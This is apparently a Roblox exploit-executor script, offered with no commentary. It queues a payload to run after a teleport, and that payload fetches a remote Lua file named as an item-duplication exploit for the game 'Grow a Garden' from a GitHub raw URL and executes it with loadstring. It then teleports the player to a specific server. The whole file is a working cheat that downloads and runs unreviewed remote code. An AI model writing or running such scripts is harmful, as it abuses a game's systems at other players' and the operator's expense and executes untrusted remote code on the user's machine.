local TeleportService = game:GetService("TeleportService")
local targetJobId = "c42962c4-a8b2-4320-998e-2deb84cd5c3f"

local postTeleportScript = [[
    loadstring(game:HttpGet('https://raw.githubusercontent.com/scytheXlol/Grow-A-Garden-OP-Methods/refs/heads/main/dupe.lua'))()
]]

queue_on_teleport(postTeleportScript)

TeleportService:TeleportToPlaceInstance(game.PlaceId, targetJobId)
